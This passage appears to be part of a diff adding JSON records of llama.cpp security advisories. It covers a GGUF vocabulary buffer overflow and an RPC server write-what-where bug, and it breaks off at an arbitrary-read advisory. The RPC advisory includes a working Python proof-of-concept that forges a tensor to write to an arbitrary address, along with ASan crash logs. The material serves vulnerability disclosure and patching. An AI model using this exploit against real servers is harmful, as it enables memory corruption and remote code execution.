fa\r\n  0x0c08800021b0: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa\r\n=>0x0c08800021c0: fa fa fd fd fd fd fd fa fa fa 00 00 00 00 00[fa]\r\n  0x0c08800021d0: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa\r\n  0x0c08800021e0: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa\r\n  0x0c08800021f0: fa fa fd fd fd fd fd fa fa fa 00 00 00 00 00 fa\r\n  0x0c0880002200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c0880002210: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:       fa\r\n  Freed heap region:       fd\r\n  Stack left redzone:      f1\r\n  Stack mid redzone:       f2\r\n  Stack right redzone:     f3\r\n  Stack after return:      f5\r\n  Stack use after scope:   f8\r\n  Global redzone:          f9\r\n  Global init order:       f6\r\n  Poisoned by user:        f7\r\n  Container overflow:      fc\r\n  Array cookie:            ac\r\n  Intra object redzone:    bb\r\n  ASan internal:           fe\r\n  Left alloca redzone:     ca\r\n  Right alloca redzone:    cb\r\n  Shadow gap:              cc\r\n==734216==ABORTING\r\n```\r\n### Impact\r\nHeap overflow read, can lead to Segmentation fault and cause llama.cpp to crash (DoS) \r\n\r\n",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-g4cc-763q-h9h6",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-06-25T08:31:33Z",
+    "published_at": "2025-06-25T06:26:17Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "llama.cpp",
+          "name": ""
+        },
+        "vulnerable_version_range": "c33fe8b8",
+        "patched_versions": "c33fe8b8",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H",
+        "score": 6.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-125",
+        "name": "Out-of-bounds Read"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-125"
+    ],
+    "credits": [
+      {
+        "login": "Yuuoniy",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "Yuuoniy",
+          "id": 22578377,
+          "node_id": "MDQ6VXNlcjIyNTc4Mzc3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/22578377?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Yuuoniy",
+          "html_url": "https://github.com/Yuuoniy",
+          "followers_url": "https://api.github.com/users/Yuuoniy/followers",
+          "following_url": "https://api.github.com/users/Yuuoniy/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Yuuoniy/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Yuuoniy/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Yuuoniy/subscriptions",
+          "organizations_url": "https://api.github.com/users/Yuuoniy/orgs",
+          "repos_url": "https://api.github.com/users/Yuuoniy/repos",
+          "events_url": "https://api.github.com/users/Yuuoniy/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Yuuoniy/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H",
+      "score": 6.6
+    }
+  },
+  {
+    "ghsa_id": "GHSA-8wwf-w4qm-gpqr",
+    "cve_id": "CVE-2025-49847",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-8wwf-w4qm-gpqr",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-8wwf-w4qm-gpqr",
+    "summary": "Buffer Overflow in llama.cpp via Malicious GGUF Model \u2013 Exploitable via Vocabulary Loading (`llama_vocab::impl::token_to_piece`)",
+    "description": "### Summary\r\nAn attacker\u2010supplied GGUF model vocabulary can trigger a buffer overflow in llama.cpp\u2019s vocabulary\u2010loading code. Specifically, the helper `_try_copy` in `llama.cpp/src/vocab.cpp: llama_vocab::impl::token_to_piece()` casts a very large `size_t` token length into an `int32_t`, causing the length check (`if (length < (int32_t)size)`) to be bypassed. As a result, memcpy is still called with that oversized size, letting a malicious model overwrite memory beyond the intended buffer. This can lead to arbitrary memory corruption and potential code execution.\r\n\r\n### Details\r\nThe vulnerability lies in the function:\r\n```cpp\r\nllama.cpp/src/vocab.cpp\r\n  llama_vocab::impl::token_to_piece(llama_token token,\r\n                                    char * buf,\r\n                                    int32_t length,\r\n                                    int32_t lstrip,\r\n                                    bool special) const\r\n```\r\n\r\nSpecifically, the inline helper `_try_copy` performs a signed comparison against a potentially oversized `size_t` without handling cases where `size_t` exceeds `INT32_MAX`. When that happens, the cast to `int32_t` wraps into a negative value, causing the length check to be bypassed and leading to an unchecked memcpy. \r\n\r\n```cpp\r\n// File: llama.cpp/src/vocab.cpp (around line 2570)\r\n\r\nauto _try_copy = [=](const char * token, size_t size) -> int32_t {\r\n    // 1) Skip up to `lstrip` leading spaces in the token string.\r\n    for (int32_t i = 0; i < lstrip && size && *token == ' '; ++i) {\r\n        token++;\r\n        size--;\r\n    }\r\n\r\n    // 2) Bound check (VULNERABLE):\r\n    //    - `length` is the maximum number of bytes the caller promised `buf` can hold (signed int32_t).\r\n    //    - `size` is the unsigned token length (size_t). If size > INT32_MAX, casting to int32_t overflows\r\n    //      and produces a negative value.\r\n    if (length < (int32_t) size) {\r\n        // Intention: return a negative error code when the token is too large to fit.\r\n        // But when size > INT32_MAX:\r\n        //    (int32_t)size becomes a negative integer (e.g. size_t=2,147,483,648 \u2192 (int32_t)=\u22122,147,483,648).\r\n        //    Then (length < negative) is always false, so this branch is skipped.\r\n        return -(int32_t) size;\r\n    }\r\n\r\n    // 3) Unchecked memcpy (VULNERABLE):\r\n    //    At this point, even if `size` is far larger than `length`, the code will reach this memcpy,\r\n    //    because the prior check falsely evaluated to false when (int32_t)size wrapped negative.\r\n    //    This copies `size` bytes into `buf`, overrunning the buffer whenever size > length.\r\n    memcpy(buf, token, size);\r\n\r\n    // 4) Return the number of bytes copied (signed).\r\n    //    Note: this cast also overflows if size > INT32_MAX, but the overflow has already happened.\r\n    return (int32_t) size;\r\n};\r\n```\r\n\r\nWhy This Check Fails for Extremely Large Tokens:\r\n1. Unsigned size vs. Signed length:\r\n    * size is `size_t` (e.g., 64-bit on most platforms).\r\n    * length is `int32_t` (maximum positive value = `2,147,483,647`).\r\n2. Cast Overflow:\r\n    * If `token_text.size() > INT32_MAX`, then (`int32_t`) size wraps into a negative value (two\u2019s-complement). For example:\r\n    ```cpp\r\n    size_t size = 2,147,483,648  // one more than INT32_MAX\r\n    (int32_t)size \u2192 \u22122,147,483,648\r\n     ```\r\n    * The comparison if (length < (int32_t) size) becomes effectively if (small_positive < large_negative), which is always false.\r\n3. Unchecked `memcpy`\r\n    * Because the bound check is bypassed, the code executes memcpy(buf, token, size).\r\n    * Even though buf only has room for length bytes, `memcpy` uses the full (very large) size, causing a buffer overflow to the tune of billions of bytes. \r\n\r\n#### Callers and Code Paths\r\n\r\nAny \u201ctoken \u2192 string\u201d conversion can overflow if `token_text.size() > INT32_MAX`. Notable call sites include:\r\n* **Model loading** (each GGUF token string passes through `token_to_piece()`)\r\n* **Detokenization** (`llama_vocab::impl::detokenize(...)`)\r\n* **Grammar routines** (`llama_grammar_apply_impl`, `llama_grammar_accept_impl`)\r\n* **Sampling & infill** (`llama_sampler_infill_apply`, etc.)\r\n* **Public API** (`llama_token_to_piece(...)`)\r\n\r\nAs soon as llama.cpp loads the oversized token, it will crash with a buffer\u2010overflow in _try_copy().\r\n![image](https://github.com/user-attachments/assets/eac1ddf9-03bc-4f7c-9f3f-33972f301ab9)\r\n\r\n### Impact\r\n* **Vulnerability Type**  \r\n  * Buffer overflow caused by a signed\u2010to\u2010unsigned conversion error in `_try_copy()`.  \r\n\r\n* **Attack Vector**  \r\n  * A malicious GGUF model file containing a vocabulary entry whose `token_text.size()` exceeds `INT32_MAX`.  \r\n  * As soon as llama.cpp attempts any \u201ctoken \u2192 string\u201d conversion (e.g., during model load, detokenization, grammar checks, or sampling), the oversized `size_t` bypasses the length check and triggers an unchecked `memcpy`.\r\n\r\n* **Affected Component**  \r\n  * `llama_vocab::impl::token_to_piece()`, which is invoked by:  \r\n    * Grammar routines (`llama_grammar_apply_impl`, `llama_grammar_accept_impl`)  \r\n    * Sampling/infill code (`llama_sampler_infill_apply`, etc.)  \r\n    * The public API (`llama_token_to_piece()`)  \r\n\r\n* **Severity**  \r\n  * **Critical** \u2013 a single malicious token in a GGUF file can immediately corrupt memory or hijack control flow.  \r\n\r\n* **Consequences**  \r\n  * **Arbitrary Memory Corruption**  \r\n    * Overwrites heap or stack data, leading to application instability or crashes.  \r\n  * **Remote Code Execution (RCE)**  \r\n    * By corrupting adjacent heap metadata, return addresses, or vtable pointers, an attacker can redirect execution flow.  \r\n  * **Denial of Service (DoS)**  \r\n    * Immediate crash under sanitizers (ASAN) or undefined behavior in production binaries.  \r\n  * **Information Disclosure**  \r\n    * Overwritten memory might reveal sensitive data or internal pointers.\r\n\r\n* **Who Is Impacted**  \r\n  * Any application or service that uses llama.cpp to load GGUF models from untrusted sources.  \r\n  * Inference servers, chatbots, or pipelines that dynamically ingest external model files are all at risk.\r\n\r\n* **Mitigation & Recommendations**  \r\n  * **Required Patch**  \r\n    * Modify `_try_copy` so that `length` and `size` are compared in an unsigned context, for example:\r\n      ```cpp\r\n      if ((size_t)length < size) {\r\n          return -(int32_t)size;\r\n      }\r\n      ```\r\n    * This change ensures `size` values above `INT32_MAX` cannot bypass the bound check.  ",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-8wwf-w4qm-gpqr",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-49847",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-06-17T02:28:40Z",
+    "published_at": "2025-06-14T09:55:24Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "llama.cpp"
+        },
+        "vulnerable_version_range": "All versions before patch",
+        "patched_versions": ">= b5662",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "score": 8.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-119",
+        "name": "Improper Restriction of Operations within the Bounds of a Memory Buffer"
+      },
+      {
+        "cwe_id": "CWE-195",
+        "name": "Signed to Unsigned Conversion Error"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-119",
+      "CWE-195"
+    ],
+    "credits": [
+      {
+        "login": "GuyGoldenberg",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "GuyGoldenberg",
+          "id": 7585494,
+          "node_id": "MDQ6VXNlcjc1ODU0OTQ=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/7585494?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/GuyGoldenberg",
+          "html_url": "https://github.com/GuyGoldenberg",
+          "followers_url": "https://api.github.com/users/GuyGoldenberg/followers",
+          "following_url": "https://api.github.com/users/GuyGoldenberg/following{/other_user}",
+          "gists_url": "https://api.github.com/users/GuyGoldenberg/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/GuyGoldenberg/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/GuyGoldenberg/subscriptions",
+          "organizations_url": "https://api.github.com/users/GuyGoldenberg/orgs",
+          "repos_url": "https://api.github.com/users/GuyGoldenberg/repos",
+          "events_url": "https://api.github.com/users/GuyGoldenberg/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/GuyGoldenberg/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 13,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "score": 8.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-wcr5-566p-9cwj",
+    "cve_id": "CVE-2024-42479",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-wcr5-566p-9cwj",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-wcr5-566p-9cwj",
+    "summary": "Write-what-where in rpc_server::set_tensor",
+    "description": "# Write-what-where in ggml_backend_cpu_buffer_get_tensor\r\n\r\n## Summary\r\n\r\nThe unsafe `data` pointer member in the `rpc_tensor` structure can cause arbitrary address writing.\r\n\r\n## Details\r\n\r\nFirst, note that the `data` pointer membe in the `rpc_tensor` structure can be controlled by the user.\r\n\r\n```C++\r\n// ggml_tensor is serialized into rpc_tensor\r\n#pragma pack(push, 1)\r\nstruct rpc_tensor {\r\n    uint64_t id;\r\n    uint32_t type;\r\n    uint64_t buffer;\r\n    uint32_t ne[GGML_MAX_DIMS];\r\n    uint32_t nb[GGML_MAX_DIMS];\r\n    uint32_t op;\r\n    int32_t  op_params[GGML_MAX_OP_PARAMS / sizeof(int32_t)];\r\n    int32_t  flags;\r\n    uint64_t src[GGML_MAX_SRC];\r\n    uint64_t view_src;\r\n    uint64_t view_offs;\r\n    uint64_t data;\r\n    char name[GGML_MAX_NAME];\r\n\r\n    char padding[4];\r\n};\r\n#pragma pack(pop)\r\n```\r\n\r\nWe can achieve arbitrary address writing during the following call by controlling the value of the `data` pointer.\r\n\r\nThe following is the function call chain that leads to arbitrary address writing:\r\n\r\n+ [[start_rpc_sercer](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1144)](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1144)\r\n\r\n  + [[rpc_serve_client](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1060)](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1060)\r\n\r\n    + [[rpc_server::set_tensor](https://github.com/ggerganov/llama.cpp/blob/e31a4f679779220312c165b0f5994c680a610e38/ggml/src/ggml-rpc.cpp#L893)](https://github.com/ggerganov/llama.cpp/blob/e31a4f679779220312c165b0f5994c680a610e38/ggml/src/ggml-rpc.cpp#L893)\r\n\r\n      + [[ggml_backend_tensor_set](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L221)](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L221)\r\n\r\n        + [[ggml_backend_cpu_buffer_set_tensor](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L577)](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L577)\r\n\r\n          ```C++\r\n          GGML_CALL static void ggml_backend_cpu_buffer_set_tensor(ggml_backend_buffer_t buffer, struct ggml_tensor * tensor, const void * data, size_t offset, size_t size) {\r\n              memcpy((char *)tensor->data + offset, data, size);\t//Write-what-where In here!\r\n              GGML_UNUSED(buffer);\r\n          }\r\n          ```\r\n\r\n## PoC\r\n\r\n### Build\r\n\r\n```shell\r\ngit clone https://github.com/ggerganov/llama.cpp.git && cd llama.cpp && mkdir build-rpc && cmake .. -DGGML_RPC=ON && cmake --build . --config Release\r\npip install pwn\r\n```\r\n\r\n### Reproduce\r\n\r\nIn `llama/llama.cpp/build-rpc/bin`,Run this command:\r\n\r\n```shell\r\n./rpc-server -p 50052\r\n```\r\n\r\nThen run the following `Python script`:\r\n\r\n```python\r\nfrom pwn import *\r\n\r\nALLOC_BUFFER = 0\r\nGET_ALIGNMENT = 1\r\nGET_MAX_SIZE = 2\r\nBUFFER_GET_BASE = 3\r\nFREE_BUFFER = 4\r\nBUFFER_CLEAR = 5\r\nSET_TENSOR = 6\r\nGET_TENSOR = 7\r\nCOPY_TENSOR = 8\r\nGRAPH_COMPUTE = 9\r\nGET_DEVICE_MEMORY = 10\r\n\r\ncontext(arch='amd64',log_level = 'debug')\r\n\r\np = remote(\"127.0.0.1\",50052)\r\npd = b''\r\ncmd = p8(GET_DEVICE_MEMORY)\r\ncontent = b''\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\np.send(pd)\r\nrecv = p.recvall(timeout=1)\r\np.close()\r\n\r\n\r\np = remote(\"127.0.0.1\",50052)\r\n\r\npd = b''\r\ncmd = p8(GET_ALIGNMENT)\r\ncontent = b''\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\n\r\ncmd = p8(ALLOC_BUFFER)\r\ncontent = p64(0x100)\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\np.send(pd)\r\nrecv = p.recvall(timeout=1)\r\nremote_ptr = u64(recv[0x18:0x20])\r\nsz = u64(recv[0x20:0x28])\r\nlog.success(f\"remote_ptr:{hex(remote_ptr)},size:{sz}\")\r\np.recvall(timeout=1)\r\np.close()\r\n\r\n'''\r\nWhen the vulnerability cannot be triggered, you might want to adjust the next_ptr variable in the script to the buffer address returned by ALLOC_BUFFER.\r\n'''\r\nnext_ptr = remote_ptr + 0x160\r\nlog.success(f'next_ptr:{hex(next_ptr)}')\r\n\r\n\r\np = remote(\"127.0.0.1\",50052)\r\ncmd = p8(ALLOC_BUFFER)\r\ncontent = p64(0x100)\r\ninput_size = p64(len(content))\r\npd = cmd + input_size + content\r\nleak_address = remote_ptr + 0x90\r\n\r\n#fake a rpc_tensor\r\nrpc_tensor_pd = flat(\r\n    {\r\n        0: [\r\n            0x1,  # id\r\n            p32(2),  # type\r\n            p64(next_ptr),  # buffer\r\n            [  # ne\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n            ],\r\n            [  # nb\r\n                p32(1),\r\n                p32(1),\r\n                p32(1),\r\n                p32(1),\r\n            ],\r\n            p32(0),  # op\r\n            [p32(0)] * 16,  # op_params (corrected from 8 to 16)\r\n            p32(0),  # flags\r\n            [p64(0)] * 10,  # src\r\n            p64(0),  # view_src\r\n            p64(0),  # view_offs\r\n            p64(0xdeadbeef),  # data\r\n            'a' * 64,  # name\r\n            'x' * 4  # padding\r\n        ],\r\n    }\r\n)\r\ncmd = p8(SET_TENSOR)\r\ncontent = flat(\r\n    {\r\n        0: [rpc_tensor_pd + p64(0) + p64(0x100),\r\n            b'a'*0x100]\r\n    }\r\n)\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\n\r\np.send(pd)\r\np.recv(0x18)\r\np.close()\r\n```\r\n\r\nIt will be Write-what-where.\r\n\r\n### Asan log\r\n\r\n```shell\r\n\u279c  bin git:(master) \u2717 ./rpc-server -p 50052\r\ncreate_backend: using CPU backend\r\nStarting RPC server on 0.0.0.0:50052, backend memory: 7896 MB\r\nAccepted client connection, free_mem=8280244224, total_mem=8280244224\r\nClient connection closed\r\n[~socket_t] closing socket 4\r\nAccepted client connection, free_mem=8280244224, total_mem=8280244224\r\n[get_alignment] alignment: 32\r\n[alloc_buffer] size: 256 -> remote_ptr: 60b000000300, remote_size: 288\r\nClient connection closed\r\n[~socket_t] closing socket 4\r\nAccepted client connection, free_mem=8280244224, total_mem=8280244224\r\n[alloc_buffer] size: 256 -> remote_ptr: 60b000000460, remote_size: 288\r\n[set_tensor] buffer: 0x60b000000460, data: 0xdeadbeef, offset: 0, size: 264\r\n=================================================================\r\n==12636==ERROR: AddressSanitizer: unknown-crash on address 0x0000deadbeef at pc 0x7f320e63a2c3 bp 0x7ffc8dcfc8d0 sp 0x7ffc8dcfc078\r\nWRITE of size 264 at 0x0000deadbeef thread T0\r\n    #0 0x7f320e63a2c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827\r\n    #1 0x7f320e3464ea in rpc_server::set_tensor(std::vector<unsigned char, std::allocator<unsigned char> > const&) (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x1464ea)\r\n    #2 0x7f320e35765a in start_rpc_server (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x15765a)\r\n    #3 0x573e32234c63 in main (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/bin/rpc-server+0x2c63)\r\n    #4 0x7f320da29d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\r\n    #5 0x7f320da29e3f in __libc_start_main_impl ../csu/libc-start.c:392\r\n    #6 0x573e32234ff4 in _start (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/bin/rpc-server+0x2ff4)\r\n\r\nAddress 0x0000deadbeef is located in the shadow gap area.\r\nSUMMARY: AddressSanitizer: unknown-crash ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy\r\n==12636==ABORTING\r\n```\r\n\r\n\r\n\r\n## Impact\r\n\r\nThis vulnerability can be used as a `primitive` for arbitrary writes in an exploit. I used this vulnerability along with another arbitrary address read vulnerability to achieve RCE(Remote Command Execute), demonstrating the significant impact of the vulnerability. The RCE video is as follows:https://drive.google.com/file/d/1vuoxQblMJ7KcaH05Z_sk_ruHSN0ftKvz/view?usp=sharing\r\n\r\n## Credit\r\n\r\nThis vulnerability was discovered by `7resp4ss` and `Guang Gong` from `360 Vulnerability Research Institute`.",
+    "severity": "critical",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-wcr5-566p-9cwj",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-42479",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-08-20T06:25:28Z",
+    "published_at": "2024-08-12T14:18:18Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "vulnerable_version_range": "< b3561",
+        "patched_versions": ">= b3561",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-123",
+        "name": "Write-what-where Condition"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-123"
+    ],
+    "credits": [
+      {
+        "login": "7resp4ss",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "7resp4ss",
+          "id": 81899344,
+          "node_id": "MDQ6VXNlcjgxODk5MzQ0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/81899344?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/7resp4ss",
+          "html_url": "https://github.com/7resp4ss",
+          "followers_url": "https://api.github.com/users/7resp4ss/followers",
+          "following_url": "https://api.github.com/users/7resp4ss/following{/other_user}",
+          "gists_url": "https://api.github.com/users/7resp4ss/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/7resp4ss/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/7resp4ss/subscriptions",
+          "organizations_url": "https://api.github.com/users/7resp4ss/orgs",
+          "repos_url": "https://api.github.com/users/7resp4ss/repos",
+          "events_url": "https://api.github.com/users/7resp4ss/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/7resp4ss/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 21,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5vm9-p64x-gqw9",
+    "cve_id": "CVE-2024-42478",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-5vm9-p64x-gqw9",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-5vm9-p64x-gqw9",
+    "summary": "Arbitrary Address Read in rpc_server::get_tensor",
+    "description": "# Arbitrary Address Read in rpc_server::get_tensor\r\n\r\n## Summary\r\n\r\nThe unsafe `data` pointer member in the `rpc_tensor` structure can cause arbitrary address reading.\r\n\r\n## Details\r\n\r\nFirst, note that the `data` pointer membe in the `rpc_tensor` structure can be controlled by the user.\r\n\r\n```C++\r\n// ggml_tensor is serialized into rpc_tensor\r\n#pragma pack(push, 1)\r\nstruct rpc_tensor {\r\n    uint64_t id;\r\n    uint32_t type;\r\n    uint64_t buffer;\r\n    uint32_t ne[GGML_MAX_DIMS];\r\n    uint32_t nb[GGML_MAX_DIMS];\r\n    uint32_t op;\r\n    int32_t  op_params[GGML_MAX_OP_PARAMS / sizeof(int32_t)];\r\n    int32_t  flags;\r\n    uint64_t src[GGML_MAX_SRC];\r\n    uint64_t view_src;\r\n    uint64_t view_offs;\r\n    uint64_t data;\r\n    char name[GGML_MAX_NAME];\r\n\r\n    char padding[4];\r\n};\r\n#pragma pack(pop)\r\n```\r\n\r\nWe can achieve arbitrary address reading during the following call by controlling the value of the `data` pointer.\r\n\r\nThe following is the function call chain that leads to arbitrary address writing:\r\n\r\n+ 